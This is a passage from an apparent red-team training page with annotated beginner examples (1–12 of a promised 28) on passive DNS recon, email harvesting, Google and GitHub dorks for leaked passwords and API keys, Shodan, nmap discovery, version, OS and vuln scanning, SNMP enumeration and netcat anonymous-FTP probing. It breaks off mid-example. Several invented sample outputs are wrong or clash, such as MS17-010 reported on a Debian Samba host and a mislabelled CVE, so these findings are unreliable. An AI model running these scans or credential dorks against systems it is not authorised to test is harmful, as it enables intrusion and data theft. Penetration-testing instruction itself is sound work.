---
title: "Beginner"
weight: 10000001
date: 2026-05-21T00:00:00+07:00
draft: false
description: "Red team beginner examples — passive recon, basic scanning, and service enumeration (Examples 1–28)"
tags: ["red-team", "beginner", "by-example"]
---

> **Ethical Use:** All examples are for authorized penetration testing, CTF competitions,
> lab environments (HackTheBox, TryHackMe), and defensive understanding only. Never apply
> these techniques against systems without explicit written authorization.

## Example 1: Passive DNS Recon — whois, dig, and host Lookups

**What this covers:** Passive DNS reconnaissance collects publicly available information about a target domain without sending packets to the target itself. These tools query registrar databases and DNS resolvers, leaving no trace on the target's infrastructure. Understanding registration details, name servers, and IP mappings forms the foundation of every engagement.

**Scenario:** You are performing an authorized pentest on `target-corp.com`. Before touching any live systems, gather all publicly available domain information using only passive lookups.

```bash
# --- whois: query domain registration records ---
whois target-corp.com
# => Registrar: GoDaddy.com, LLC
# => Registrar WHOIS Server: whois.godaddy.com
# => Creation Date: 2012-03-15T09:00:00Z    # => domain age: 13 years, mature org
# => Expiry Date:   2027-03-15T09:00:00Z    # => not expiring soon, unlikely to lapse
# => Name Server: ns1.target-corp.com       # => self-hosted DNS — may reveal infra
# => Name Server: ns2.target-corp.com
# => Registrant Email: admin@target-corp.com  # => potential phishing / OSINT target
# => Registrant Org:   Target Corp, Inc.

# --- dig: query DNS records directly ---
dig target-corp.com A
# => ;; ANSWER SECTION:
# => target-corp.com.  300  IN  A  203.0.113.42   # => primary web server IP

dig target-corp.com MX
# => ;; ANSWER SECTION:
# => target-corp.com.  300  IN  MX  10  mail.target-corp.com.   # => in-house mail server
# => target-corp.com.  300  IN  MX  20  mail2.target-corp.com.  # => secondary MX

dig target-corp.com NS
# => ;; ANSWER SECTION:
# => target-corp.com.  3600  IN  NS  ns1.target-corp.com.   # => same as whois — confirmed
# => target-corp.com.  3600  IN  NS  ns2.target-corp.com.

dig target-corp.com TXT
# => ;; ANSWER SECTION:
# => target-corp.com. 300 IN TXT "v=spf1 ip4:203.0.113.0/24 include:sendgrid.net ~all"
# => SPF record reveals: office IP block 203.0.113.0/24 + SendGrid for bulk mail
# => target-corp.com. 300 IN TXT "MS=ms12345678"  # => Microsoft 365 verification token

# --- host: simpler forward + reverse lookups ---
host target-corp.com
# => target-corp.com has address 203.0.113.42
# => target-corp.com mail is handled by mail.target-corp.com

host 203.0.113.42
# => 42.113.0.203.in-addr.arpa domain name pointer target-corp.com.
# => reverse DNS matches forward DNS — consistent, well-maintained zone
```

**Key Takeaway:** Whois reveals registration metadata including admin contacts; dig maps the full DNS attack surface; TXT records often leak third-party services and internal IP ranges. Defenders should audit TXT and MX records regularly for unintended disclosure.

**Why It Matters:** Passive DNS recon is completely legal against any public domain and leaves zero footprint on the target. Every subsequent active phase — scanning, exploitation — depends on the IP addresses, subdomains, and service providers discovered here. Red teamers who skip this step often miss shadow IT infrastructure revealed only through MX or SPF records, and they waste time scanning IP ranges that do not belong to the target.

---

## Example 2: OSINT with theHarvester — Email and Subdomain Harvesting

**What this covers:** theHarvester automates collection of email addresses, employee names, hostnames, and IP addresses from dozens of public sources including search engines, LinkedIn, and certificate transparency logs. It condenses hours of manual OSINT into a single command run. The output feeds spear-phishing lists and expands the DNS attack surface.

**Scenario:** You have authorization to assess `target-corp.com`. Run theHarvester across multiple sources to build an email list and subdomain map before any active scanning begins.

```bash
# Basic run: query Google, Bing, crtsh (cert transparency), and LinkedIn
theHarvester -d target-corp.com -b google,bing,crtsh,linkedin -l 200

# -d   target domain
# -b   comma-separated source list (no spaces)
# -l   result limit per source (200 is a reasonable start)

# --- Sample output ---
# [*] Emails found:
# john.smith@target-corp.com       # => real employee, potential phishing target
# jane.doe@target-corp.com         # => another employee
# helpdesk@target-corp.com         # => shared inbox — often less scrutinized
# noreply@target-corp.com          # => automated sender, not a human target

# [*] Hosts found:
# mail.target-corp.com       203.0.113.10   # => mail server confirmed with IP
# vpn.target-corp.com        203.0.113.20   # => VPN endpoint — high-value target
# dev.target-corp.com        10.x.0.5       # => internal IP leaked via DNS
# staging.target-corp.com    203.0.113.55   # => staging env — often less hardened
# api.target-corp.com        203.0.113.60   # => API endpoint — worth probing

# Save results for later stages
theHarvester -d target-corp.com -b google,bing,crtsh,linkedin -l 200 \
  -f /tmp/harvester-target-corp
# => Writes harvester-target-corp.xml and harvester-target-corp.json
# => JSON is easier to parse in automation pipelines
```

**Key Takeaway:** Certificate transparency logs (crtsh) reveal subdomains that never appear in search results; email name patterns (`firstname.lastname@`) let you construct addresses for employees found on LinkedIn. Defenders should monitor cert transparency for unauthorized certificates and enforce email address obfuscation on public-facing pages.

**Why It Matters:** A single theHarvester run can surface VPN endpoints, developer subdomains, and staging servers that are invisible to direct scanning but are documented in public certificates and indexed pages. Email addresses harvested here directly feed password-spraying and phishing campaigns in later stages. Red teamers use this output to prioritize which IPs and subdomains warrant deeper active investigation.

---

## Example 3: Google Dorking — Advanced Search Operators for Exposed Info

**What this covers:** Google dorking uses advanced search operators to find sensitive information indexed by search engines — configuration files, login portals, directory listings, and credentials left in public repositories. No packets reach the target; all queries go to Google's servers. The results frequently expose more than a full network scan would.

**Scenario:** Before touching any target infrastructure, use Google dorks against `target-corp.com` to identify exposed files and entry points that defenders may have overlooked.

```bash
# Run these queries in a browser or via a Google Custom Search API key.
# Document each result URL carefully — they form the passive recon report.

# site: restrict results to one domain
site:target-corp.com
# => Shows all indexed pages — count gives rough site size
# => Look for unexpected subdomains appearing in results

# filetype: search for specific file extensions
site:target-corp.com filetype:pdf
# => Often reveals internal documents, product specs, org charts

site:target-corp.com filetype:xlsx OR filetype:csv
# => Spreadsheets sometimes contain internal data, employee lists, pricing

site:target-corp.com filetype:sql OR filetype:bak OR filetype:log
# => Database dumps or log files accidentally left web-accessible

# inurl: match text in the URL path
site:target-corp.com inurl:admin
# => /admin, /adminpanel, /wp-admin — potential login pages

site:target-corp.com inurl:login OR inurl:signin OR inurl:portal
# => Enumerate authentication endpoints across the estate

site:target-corp.com inurl:config OR inurl:setup OR inurl:.env
# => Configuration files — may contain credentials or connection strings

# intitle: match page title
intitle:"Index of" site:target-corp.com
# => Apache/Nginx directory listings — browse exposed file trees

# Combining operators — powerful compound dorks
site:target-corp.com inurl:wp-content
# => WordPress content directory — confirms CMS and version path

site:target-corp.com "DB_PASSWORD" OR "api_key" OR "secret_key"
# => Searches indexed pages for credential strings (rare but devastating when found)

# GitHub dork — secrets in public repositories
site:github.com "target-corp.com" "password" OR "secret" OR "token"
# => Finds employee repos that reference the target domain with credentials
```

**Key Takeaway:** The `intitle:"Index of"` dork combined with `site:` reveals directory listings in seconds; the GitHub compound dork finds leaked credentials that bypass every network control. Defenders must configure web servers to disable directory listings, use `.gitignore` for secrets, and adopt secret-scanning tools on all repositories.

**Why It Matters:** Google dorks require zero technical skill and zero network access yet routinely expose administration panels, backup files, and plaintext credentials. Red teamers document every dork result as a finding, since an exposed admin login or leaked API key can bypass months of planned exploitation work. This technique is the highest-value passive activity per unit of time invested.

---

## Example 4: Shodan Recon — Searching for Exposed Services

**What this covers:** Shodan is a search engine for internet-connected devices. It continuously scans the entire IPv4 space and indexes banners, TLS certificates, and service responses. Querying Shodan reveals what services are exposed on a target's IP ranges without sending a single packet to the target.

**Scenario:** You have identified that `target-corp.com` resolves to `203.0.113.42` and the SPF record reveals the IP block `203.0.113.0/24`. Use the Shodan CLI to map all exposed services across that range.

```bash
# Install shodan CLI and initialize with your API key (free tier available)
pip install shodan
shodan init YOUR_API_KEY_HERE

# Search for the target domain in Shodan's index
shodan search "hostname:target-corp.com"
# => 203.0.113.42   80/tcp    Apache httpd 2.4.51   target-corp.com
# => 203.0.113.20   443/tcp   nginx/1.18.0          vpn.target-corp.com
# => 203.0.113.10   25/tcp    Postfix smtpd         mail.target-corp.com
# => 203.0.113.55   8080/tcp  Apache Tomcat/9.0.50  staging.target-corp.com
# => Note: Tomcat on 8080 is often development-grade, possibly less hardened

# Get full details for a specific IP
shodan host 203.0.113.42
# => IP: 203.0.113.42
# => Organization: Target Corp Inc
# => OS: Unknown
# => Ports:
# =>   80/tcp   Apache httpd 2.4.51 (Ubuntu)
# =>          Server: Apache/2.4.51 (Ubuntu)       # => exact version — check CVEs
# =>          X-Powered-By: PHP/7.4.3               # => PHP version exposed
# =>   443/tcp  Certificate: target-corp.com, *.target-corp.com
# =>          Issued by: Let's Encrypt (CN=R3)
# =>          Valid until: 2026-08-10                # => cert expiry — not relevant for attack
# =>   22/tcp   SSH-2.0-OpenSSH_8.2p1 Ubuntu        # => SSH version for CVE matching

# Search entire IP block
shodan search "net:203.0.113.0/24"
# => Returns all Shodan-indexed hosts in the /24
# => Compare against whois CIDR to confirm these are all target-owned

# Search for specific vulnerable services across the org
shodan search "org:'Target Corp Inc' port:3389"
# => Any RDP exposed to internet — critical finding if found

shodan search "org:'Target Corp Inc' http.title:'Dashboard'"
# => Web dashboards (Grafana, Kibana, Jenkins) exposed without auth
# => These are frequently misconfigured and accessible without credentials

# Download full results to file
shodan download --limit 100 target-corp-shodan "hostname:target-corp.com"
# => Downloads 100 results in JSON format
shodan parse --fields ip_str,port,transport,product target-corp-shodan.json.gz
# => Parses compressed results: ip, port, protocol, service name per line
```

**Key Takeaway:** Shodan reveals the exact software version stack exposed to the internet, enabling direct CVE lookups without active scanning. A Tomcat instance on port 8080 found here goes straight to the exploitation shortlist. Defenders should use `shodan monitor` alerts to receive notifications when new ports for their IP range appear in the index.

**Why It Matters:** Shodan data is collected continuously by Shodan's own scanners — by the time a red teamer queries it, the data may be hours to days old but is still highly actionable. It surfaces forgotten assets, shadow IT exposed by developers, and services that security teams believe are internal but are actually internet-reachable. Red teamers treat Shodan as the definitive passive inventory of the target's internet footprint.

---

## Example 5: Active Host Discovery — nmap Ping Sweep on a /24 Subnet

**What this covers:** A ping sweep uses ICMP echo requests (and optionally TCP/UDP probes) to determine which hosts in a subnet are alive, without performing a full port scan. This is the first active step after passive recon, mapping the live attack surface before committing to slower, noisier port scans. The `-sn` flag tells nmap to skip port scanning entirely.

**Scenario:** You are performing an authorized pentest on the internal lab network `192.0.2.0/24`. Identify all live hosts before deciding where to focus port scanning.

```bash
# Basic ICMP ping sweep — fast but blocked by host-based firewalls
sudo nmap -sn 192.0.2.0/24

# -sn  skip port scan (ping sweep only)
# sudo  required for raw socket ICMP probes

# --- Sample output ---
# Starting Nmap 7.94 ( https://nmap.org )
# Nmap scan report for 192.0.2.1
# Host is up (0.00045s latency).      # => gateway/router — always present
# MAC Address: AA:BB:CC:DD:EE:01 (Cisco Systems)   # => Cisco device confirmed

# Nmap scan report for 192.0.2.5
# Host is up (0.0023s latency).       # => target: low latency = same broadcast domain
# MAC Address: 08:00:27:AB:CD:EF (Oracle VirtualBox)  # => VM — lab environment confirmed

# Nmap scan report for 192.0.2.10
# Host is up (0.0031s latency).
# MAC Address: 00:50:56:AA:BB:CC (VMware)    # => another VM on the lab network

# Nmap scan report for 192.0.2.100
# Host is up (0.0018s latency).
# MAC Address: B8:27:EB:FF:00:11 (Raspberry Pi Foundation)   # => Pi device — IoT-class

# Nmap done: 256 IP addresses (4 hosts up) scanned in 2.13 seconds
# => 4 live hosts found out of 256 possible — small network footprint

# More thorough sweep: add ARP, TCP, and UDP probes to catch hosts blocking ICMP
sudo nmap -sn -PE -PS22,80,443 -PA80 -PU53 192.0.2.0/24
# -PE      ICMP echo (standard ping)
# -PS22,80,443  TCP SYN to ports 22, 80, 443 — catches Windows hosts blocking ICMP
# -PA80    TCP ACK to port 80 — bypasses some stateful firewalls
# -PU53    UDP probe to port 53 — discovers DNS servers blocking TCP/ICMP

# Output results to grepable format for scripting
sudo nmap -sn 192.0.2.0/24 -oG /tmp/hosts-up.txt
grep "Up" /tmp/hosts-up.txt | awk '{print $2}'
# => 192.0.2.1
# => 192.0.2.5
# => 192.0.2.10
# => 192.0.2.100
# Produces a clean host list for feeding into the next scan stage
```

**Key Takeaway:** The grepable output (`-oG`) combined with `awk` produces a clean host list that feeds directly into subsequent targeted scans — never scan blind when you can enumerate live hosts first. Defenders should monitor for sweeps via IDS rules that alert on sequential ICMP probes across a /24.

**Why It Matters:** Scanning 65,535 ports on 256 hosts is far slower and noisier than first identifying the four live hosts and focusing there. Host discovery is the reconnaissance-to-exploitation bridge that makes every later phase faster and stealthier. Red teamers who skip the ping sweep waste scan time on dead IPs and generate unnecessary noise across the segment.

---

## Example 6: TCP SYN Scan — nmap Stealth Scan with Annotated Output

**What this covers:** The TCP SYN scan (also called a half-open scan) sends a SYN packet and waits for a SYN-ACK (open) or RST (closed) response without completing the three-way handshake. Because no full connection is established, many older logging systems miss these probes, giving the scan its "stealth" reputation — though modern IDS systems detect it readily.

**Scenario:** You have identified `192.0.2.5` as a live host. Run a SYN scan against the top 1000 ports to map the service landscape before deeper investigation.

```bash
sudo nmap -sS -p- --min-rate 1000 192.0.2.5 -oN /tmp/syn-scan.txt

# -sS           TCP SYN (stealth) scan — default when run as root
# -p-           scan all 65535 ports (not just top 1000)
# --min-rate 1000  send at least 1000 packets/sec — faster but noisier
# -oN           save normal (human-readable) output to file

# --- Sample output ---
# Starting Nmap 7.94
# Nmap scan report for 192.0.2.5
# Host is up (0.0023s latency).
# Not shown: 65528 closed tcp ports (reset)   # => RST received on 65528 ports = closed
# PORT      STATE    SERVICE
# 22/tcp    open     ssh          # => SSH open — try credential attacks later
# 80/tcp    open     http         # => web server — start directory brute-forcing
# 139/tcp   open     netbios-ssn  # => NetBIOS — SMB stack present
# 443/tcp   open     https        # => HTTPS — check certificate for extra subdomains
# 445/tcp   open     microsoft-ds # => SMB direct — enumerate shares, check EternalBlue
# 3306/tcp  open     mysql        # => MySQL exposed to network — critical if not localhost-only
# 8080/tcp  open     http-proxy   # => alternate HTTP — may be admin panel or dev server
# Nmap done: 1 IP address (1 host up) scanned in 67.34 seconds

# Focused rescan: top 1000 ports for speed in time-constrained engagements
sudo nmap -sS --top-ports 1000 192.0.2.5
# => Much faster — covers 99% of common services
# => Use -p- for comprehensive coverage when stealth is less critical

# Understanding port states:
# open        => service is listening and accepting connections
# closed      => host responded with RST — port reachable but no service
# filtered    => no response or ICMP unreachable — firewall likely blocking
# open|filtered => UDP only — nmap cannot distinguish open from filtered without response
```

**Key Takeaway:** MySQL on port 3306 reachable from the network (not just localhost) is an immediate critical finding — databases should never be directly internet- or network-accessible. Defenders should audit firewall rules to ensure databases bind only to `127.0.0.1` or a management VLAN.

**Why It Matters:** The SYN scan provides the complete open-port inventory that drives every subsequent decision in an engagement — which exploits to attempt, which services to enumerate, and which credentials to test. Red teamers always save scan results with `-oN`, `-oX` (XML for tool import), or `-oG` (grepable) because re-scanning wastes time and increases detection risk.

---

## Example 7: Service Version Detection — nmap -sV Banner Grabbing

**What this covers:** Service version detection sends crafted probes to open ports and matches responses against a database of known service signatures to identify the exact software and version running. Version information is the bridge between "port is open" and "here is the CVE." Without it, you know a service exists but not whether it is vulnerable.

**Scenario:** The SYN scan of `192.0.2.5` revealed open ports 22, 80, 443, 445, 3306, and 8080. Run version detection to identify exact software versions before searching for exploits.

```bash
sudo nmap -sV -p 22,80,443,445,3306,8080 192.0.2.5

# -sV   enable service/version detection
# -p    scan only the specified ports (faster — you already know what's open)

# --- Sample output ---
# PORT     STATE SERVICE     VERSION
# 22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
#                            # => OpenSSH 7.4p1 — check for CVE-2018-15473 (user enum)
#                            # => "Debian 10+deb9u7" pins the OS: Debian 9 Stretch

# 80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
#                            # => Apache 2.4.25 — EOL, multiple CVEs including CVE-2017-7679
#                            # => Debian confirms same OS as SSH banner

# 443/tcp  open  ssl/http    Apache httpd 2.4.25 ((Debian))
#                            # => Same Apache instance serving HTTPS — same CVEs apply

# 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
#                            # => Samba version range — use enum4linux for exact version
#                            # => WORKGROUP = not domain-joined, likely standalone

# 3306/tcp open  mysql       MySQL 5.7.28
#                            # => MySQL 5.7.28 — EOL since Oct 2023, multiple CVEs
#                            # => Check for CVE-2020-2574 and default credentials

# 8080/tcp open  http        Apache Tomcat 9.0.30
#                            # => Tomcat 9.0.30 — check CVE-2020-1938 (Ghostcat, AJP)
#                            # => /manager/html is the high-value admin target

# Service Info: Host: TARGET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Increase probe intensity for stubborn services (slower but more accurate)
sudo nmap -sV --version-intensity 9 -p 8080 192.0.2.5
# --version-intensity 0-9: 0=lightest probes, 9=all probes
# => Use intensity 9 when default probes return "tcpwrapped" or "unknown"
```

**Key Takeaway:** Tomcat 9.0.30 on port 8080 is directly vulnerable to CVE-2020-1938 (Ghostcat — CVSS 9.8), which allows arbitrary file read and potentially remote code execution via the AJP connector. This single version detection result could lead to full system compromise. Defenders must enforce patch management policies and disable AJP when not needed.

**Why It Matters:** Version detection transforms a list of open ports into a prioritized exploit queue. Red teamers feed each version string directly into searchsploit (Example 23) and the NVD CVE database (Example 24). The version string also fingerprints the OS, which narrows privilege escalation paths after initial access. Never skip version detection when stealth constraints allow it.

---

## Example 8: OS Fingerprinting — nmap -O Output Annotated

**What this covers:** OS fingerprinting analyzes subtle differences in TCP/IP stack behavior — initial window size, TTL values, TCP options order — to identify the target's operating system and kernel version. Knowing the OS family and version narrows privilege escalation paths, kernel exploit options, and the set of applicable CVEs before gaining access.

**Scenario:** You have confirmed open ports on `192.0.2.5`. Run OS fingerprinting to confirm the operating system and refine your exploitation planning.

```bash
sudo nmap -O --osscan-guess 192.0.2.5

# -O              enable OS detection (requires root/sudo)
# --osscan-guess  print best guess even when confidence < 100%

# --- Sample output ---
# OS detection performed. Please report any incorrect results.
# Nmap scan report for 192.0.2.5
# Host is up (0.0023s latency).

# OS CPE: cpe:/o:linux:linux_kernel:3.16
# OS details: Linux 3.16 - 4.6
# # => Kernel 3.16–4.6 range — narrow it further with -sV banner (Debian 9 = 4.9 kernel)
# # => Older kernel versions may be vulnerable to Dirty COW (CVE-2016-5195)

# Network Distance: 1 hop            # => directly adjacent — same LAN or one router hop

# TCP/IP fingerprint:
# OS:SCAN(V=7.94%E=4%D=5/21%OT=22%CT=1%CU=33587%PV=Y%DS=1%DC=D%G=Y%M=080027%TM=6A...
# OS:B(S=O%A=S+%F=AS%RD=0%Q=)        # => SYN probe response matches Linux pattern
# # => Full fingerprint stored in /usr/share/nmap/nmap-os-db for matching

# Aggressive OS guesses (confidence < 100% — shown due to --osscan-guess):
# Linux 3.16 (96%)    # => highest confidence match
# Linux 4.4 (92%)     # => second candidate — Ubuntu 16.04 LTS uses 4.4
# Linux 4.9 (88%)     # => third candidate — Debian 9 Stretch uses 4.9

# Device type: general purpose   # => standard server/workstation, not embedded/IoT

# Combine with version detection for higher OS accuracy
sudo nmap -O -sV --osscan-guess 192.0.2.5
# => Version banners (e.g., "Debian 9") confirm the OS guess to near-certainty
# => Combined output: "Linux 4.9 (Debian 9 Stretch)" — unambiguous for exploit planning
```

**Key Takeaway:** Combining `-O` with `-sV` resolves ambiguity between OS candidates — version banners from Apache or OpenSSH explicitly state the distribution. Linux kernel 4.9 on Debian 9 means Dirty COW is not applicable (patched), but DirtyCred or other kernel exploits for that era may be relevant. Defenders should consider randomizing TCP/IP stack parameters to frustrate fingerprinting.

**Why It Matters:** OS fingerprinting is the pivot point between external reconnaissance and post-exploitation planning. A Windows Server 2008 R2 OS detection triggers a completely different exploit path than Debian 9 — EternalBlue vs. kernel exploits. Red teamers use OS details to pre-load the correct privilege escalation playbook before obtaining a shell, saving critical time during limited engagement windows.

---

## Example 9: Aggressive Scan — nmap -A Combining OS, Version, Scripts, Traceroute

**What this covers:** The `-A` flag enables aggressive scanning mode, combining OS detection (`-O`), service version detection (`-sV`), default NSE script scanning (`-sC`), and traceroute into a single pass. It produces the most complete picture of a single host but is significantly noisier and slower than individual scans. Use it when thoroughness outweighs stealth concerns.

**Scenario:** You have confirmed `192.0.2.5` is a key target. Run an aggressive scan to get a complete host profile in one command for your engagement report.

```bash
sudo nmap -A -p 22,80,443,445,3306,8080 192.0.2.5 -oN /tmp/aggressive-scan.txt

# -A    aggressive mode: -sV + -O + -sC + --traceroute
# -p    limit to known-open ports from earlier SYN scan
# -oN   save normal output for reporting

# --- Sample output (condensed) ---
# PORT     STATE SERVICE     VERSION
# 22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u7
# | ssh-hostkey:
# |   2048 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99 (RSA)
# |   256 a1:b2:c3:d4:e5:f6:07:18:29:3a:4b:5c (ECDSA)
# |_  256 01:12:23:34:45:56:67:78:89:9a:ab (ED25519)
# # => Three host keys extracted — useful for SSH host fingerprinting across resets

# 80/tcp   open  http        Apache httpd 2.4.25
# |_http-title: Target Corp - Internal Portal   # => page title from HTTP response
# | http-methods:
# |_  Supported Methods: GET HEAD POST OPTIONS   # => OPTIONS reveals allowed methods
# |_http-server-header: Apache/2.4.25 (Debian)

# 445/tcp  open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
# | smb-security-mode:
# |   account_used: guest           # => GUEST ACCESS ENABLED — critical finding
# |   authentication_level: user    # => user-level auth but guest allowed
# |   challenge_response: supported
# |_  message_signing: disabled and not required   # => SMB signing off = relay attacks possible

# | smb2-security-mode:
# |_  3.1.1: Message signing enabled but not required  # => SMBv2 signing also optional

# 8080/tcp open  http        Apache Tomcat 9.0.30
# |_http-title: Apache Tomcat/9.0.30              # => default Tomcat page — not customized
# | http-methods:
# |_  Supported Methods: GET HEAD POST PUT DELETE  # => PUT + DELETE enabled — dangerous!

# TRACEROUTE (using port 80/tcp)
# HOP RTT     ADDRESS
# 1   0.45 ms 192.0.2.1    # => gateway — 1 hop = same subnet
# 2   0.80 ms 192.0.2.5    # => target — confirmed routing path

# OS and Network Distance: 1 hop, Linux 4.9, Debian 9 Stretch
```

**Key Takeaway:** The aggressive scan revealed two critical findings in one pass: SMB guest access enabled (unauthenticated share access) and HTTP PUT/DELETE enabled on Tomcat (potential file upload to remote code execution). Defenders should disable SMB guest accounts and restrict Tomcat's allowed HTTP methods to GET, HEAD, and POST only.

**Why It Matters:** The `-A` scan is the standard "first full look" command that most engagement reports reference as the primary discovery step. It produces a document-ready output combining network topology, services, versions, and NSE script results. Red teamers run it on high-value targets after narrowing the live host list and use the output to draft the attack chain before touching any exploitation tools.

---

## Example 10: NSE Script Scanning — nmap --script vuln

**What this covers:** The Nmap Scripting Engine (NSE) ships with hundreds of scripts organized into categories. The `vuln` category scripts perform non-destructive vulnerability checks — testing for known CVEs, misconfigurations, and default credentials — without attempting exploitation. Running `--script vuln` against a target provides an automated first-pass vulnerability assessment.

**Scenario:** You have mapped all open ports on `192.0.2.5`. Run NSE vulnerability scripts to identify known vulnerabilities before moving to manual exploit research.

```bash
sudo nmap --script vuln -p 22,80,443,445,3306,8080 192.0.2.5

# --script vuln   run all scripts in the "vuln" NSE category
# These scripts probe for known CVEs and misconfigs without exploiting

# --- Sample output ---
# PORT    STATE SERVICE
# 80/tcp  open  http
# | http-vuln-cve2017-8629:
# |   VULNERABLE:
# |   Apache mod_auth_digest off-by-one buffer overflow
# |     State: VULNERABLE
# |     IDs: CVE:CVE-2017-8629
# |     Risk factor: High (CVSS 7.5)     # => high severity — research PoC availability

# 445/tcp open  microsoft-ds
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
# |     State: VULNERABLE
# |     IDs: CVE:CVE-2017-0143            # => EternalBlue — remote code execution
# |     Risk factor: CRITICAL (CVSS 9.3)  # => highest priority finding of the scan
# |     Description: The SMB server is vulnerable to the EternalBlue exploit
# |     Disclosure date: 2017-03-14
# |     References:
# |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

# 3306/tcp open mysql
# | mysql-empty-password:
# |   root account has empty password    # => MySQL root with no password — full DB access

# | mysql-vuln-cve2012-2122:
# |   VULNERABLE: Authentication bypass
# |     State: LIKELY VULNERABLE          # => timing-based auth bypass (older MySQL)

# 8080/tcp open http
# | http-shellshock:
# |   VULNERABLE: Shellshock (bash remote code injection)
# |     State: VULNERABLE (Exploitable)    # => CGI scripts call bash — RCE via headers
# |     IDs: CVE:CVE-2014-6271

# Run a specific script by name for focused checks
sudo nmap --script smb-vuln-ms17-010 -p 445 192.0.2.5
# => Targeted check for EternalBlue only — faster for reporting a single CVE

# List all available vuln category scripts
ls /usr/share/nmap/scripts/ | grep vuln
# => smb-vuln-ms17-010.nse
# => http-shellshock.nse
# => ssl-heartbleed.nse    # => Heartbleed OpenSSL check
# => ftp-vuln-cve2010-4221.nse
# => ... (many more)
```

**Key Takeaway:** EternalBlue (MS17-010) on SMB is a remote code execution vulnerability that requires no credentials — finding it marks `192.0.2.5` as immediately compromisable. The MySQL empty root password independently gives full database access. Defenders must patch SMBv1 or disable the protocol entirely and enforce MySQL strong passwords with `ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPass';`.

**Why It Matters:** NSE vuln scripts compress vulnerability assessment from hours of manual research into minutes. A single `--script vuln` run can surface critical CVEs, default credentials, and protocol weaknesses that would otherwise require running a separate scanner. Red teamers use these results to prioritize their exploitation queue — critical CVSS findings go first — and to populate the vulnerability section of the engagement report with precise CVE identifiers.

---

## Example 11: UDP Scan — nmap -sU on Top Ports

**What this covers:** UDP services are invisible to TCP SYN scans but host critical infrastructure — DNS (53), SNMP (161), TFTP (69), and NTP (123). UDP scanning is slow because there is no connection handshake; nmap must wait for ICMP port-unreachable responses or use protocol-specific probes. Many UDP ports show `open|filtered` because the absence of a response is ambiguous.

**Scenario:** After mapping TCP services on `192.0.2.5`, run a UDP scan against the top 100 UDP ports to find DNS, SNMP, and other UDP-based services that may expose additional attack surface.

```bash
sudo nmap -sU --top-ports 100 192.0.2.5 -oN /tmp/udp-scan.txt

# -sU             UDP scan mode (requires root)
# --top-ports 100 scan only the 100 most common UDP ports (full UDP scan takes hours)
# Be patient: UDP scanning takes significantly longer than TCP

# --- Sample output ---
# PORT    STATE         SERVICE
# 53/udp  open          domain        # => DNS running — attempt zone transfer (dig axfr)
# 69/udp  open|filtered tftp          # => TFTP possible — may allow unauthenticated file access
# 123/udp open          ntp           # => NTP — check for monlist amplification (CVE-2013-5211)
# 161/udp open          snmp          # => SNMP v1/v2c — likely community string "public"
# 500/udp open|filtered isakmp        # => IKE/IPsec — VPN endpoint may be present

# Interpreting open|filtered:
# => No response received from port 69 or 500
# => Could mean: port is open (service ignores probe) OR filtered (firewall drops)
# => Use version detection to disambiguate

sudo nmap -sUV -p 53,161 192.0.2.5
# -sUV  UDP scan + version detection on specific ports
# => More probes sent to confirm open state and identify service version

# SNMP enumeration — once port 161/udp confirmed open
snmp-check 192.0.2.5 -c public
# -c public  community string "public" (most common default)
# => System description: Linux TARGET 4.9.0-12-amd64 x86_64
# => System contact:     root@target-corp.com          # => admin email
# => System location:    Server Room B                 # => physical location
# => Running processes: sshd, apache2, mysqld, tomcat  # => confirms services from TCP scan
# => Network interfaces: eth0 192.0.2.5/24            # => interface + IP confirmed
# => Open TCP ports: 22, 80, 443, 445, 3306, 8080      # => SNMP reveals all TCP listeners!

# DNS zone transfer attempt — if port 53 is authoritative
dig axfr target-corp.com @192.0.2.5
# => If successful: returns all DNS records for the zone
# => Zone transfers should be restricted to authorized secondary nameservers only
```

**Key Takeaway:** SNMP with the default community string `public` exposes a complete system inventory — running processes, network interfaces, and open ports — without any authentication. SNMP v1 and v2c transmit community strings in plaintext. Defenders must change default SNMP community strings, restrict SNMP access by source IP, and migrate to SNMPv3 with authentication and encryption.

**Why It Matters:** Many security teams focus entirely on TCP and leave UDP services unmonitored. SNMP community string brute-forcing can return the equivalent of running a full system audit remotely without any credentials. NTP monlist can be abused for amplification DDoS. Red teamers never skip UDP scanning on internal networks where SNMP is commonly deployed for network monitoring.

---

## Example 12: Banner Grabbing with Netcat — Manual Service Probing

**What this covers:** Netcat (`nc`) establishes raw TCP connections to any port, allowing manual interaction with service banners and protocol responses. Unlike nmap's automated probes, netcat lets you craft arbitrary requests and observe raw responses — useful for confirming service behavior, testing input handling, and grabbing version banners that automated tools miss or misclassify.

**Scenario:** You want to manually verify the HTTP, FTP, and SSH service banners on `192.0.2.5` and probe responses to understand exact version and configuration details not captured by nmap.

```bash
# HTTP banner grab — send a minimal HTTP request and capture the response headers
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc 192.0.2.5 80

# echo -e     enable escape sequences (\r\n for HTTP line endings)
# nc          raw TCP connection to port 80

# => HTTP/1.1 200 OK
# => Date: Wed, 21 May 2026 03:00:00 GMT
# => Server: Apache/2.4.25 (Debian)      # => version in Server header — confirmed
# => X-Powered-By: PHP/7.4.3             # => PHP version exposed — should be removed
# => Content-Type: text/html; charset=UTF-8
# => Connection: close
# => (blank line marks end of headers)

# FTP banner grab — just connect, FTP servers send banner immediately
nc 192.0.2.5 21
# => 220 (vsFTPd 3.0.3)    # => FTP server type and version banner
# => Ready for connection   # => server is accepting connections
# After seeing banner, type: QUIT
# => 221 Goodbye.

# Check for anonymous FTP login manually
nc 192.0.2.5 21
# => 220 (vsFTPd 3.0.3)
USER anonymous
# => 331 Please specify the password.
PASS anonymous@example.com
# => 230 Login successful.      # => anonymous login accepted — critical finding
LIST
# => 150 Here comes the directory listing.
# => -rw-r--r-- 1 ftp ftp  1234 Jan 01 12:00 backup.zip   # => file accessible to anonymous
# => 226 Directory send OK.

# SSH banner grab — SSH sends version banner immediately on connect
nc 192.0.2.5 22
